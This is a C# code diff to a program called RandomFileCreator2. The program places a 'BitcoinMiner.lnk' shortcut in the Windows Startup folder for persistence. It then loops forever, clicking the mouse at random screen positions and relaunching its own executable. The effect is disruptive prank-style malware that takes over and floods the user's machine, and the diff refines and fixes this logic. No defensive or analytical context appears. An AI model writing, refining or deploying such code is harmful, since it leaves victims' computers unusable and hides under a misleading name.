@@ -36,7 +36,7 @@ namespace RandomFileCreator2
             {
                 if (System.IO.File.Exists(startUp))
                     Run();
-                CreateShortcut(startUp);
+                else CreateShortcut(startUp);
             }
             catch (Exception)
             {
@@ -45,7 +45,7 @@ namespace RandomFileCreator2
                     string userStartUp = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\BitcoinMiner.lnk";
                     if (System.IO.File.Exists(userStartUp))
                         Run();
-                    CreateShortcut(userStartUp);
+                    else CreateShortcut(userStartUp);
                 }
                 catch (Exception) { }
             }
@@ -59,9 +59,10 @@ namespace RandomFileCreator2
             {
                 while (true)
                 {
-                    Cursor.Position = new Point(random.Next(0, screenWidth), random.Next(0, screenHeight));
-                    DoMouseClick();
-                    DoMouseClick();
+                    int x = random.Next(0, screenWidth);
+                    int y = random.Next(0, screenHeight);
+                    DoMouseClick(x, y);
+                    DoMouseClick(x, y);
                     Process.Start(appPath);
                 }
             }
@@ -71,17 +72,15 @@ namespace RandomFileCreator2
             }
         }
 
-        public static void DoMouseClick()
+        public static void DoMouseClick(int x, int y)
         {
-            int x = Cursor.Position.X;
-            int y = Cursor.Position.Y;
             try
             {
                 mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, x, y, 0, 0);
             }
             catch (Exception)
             {
-                DoMouseClick();
+                DoMouseClick(x, y);
             }
         }
 
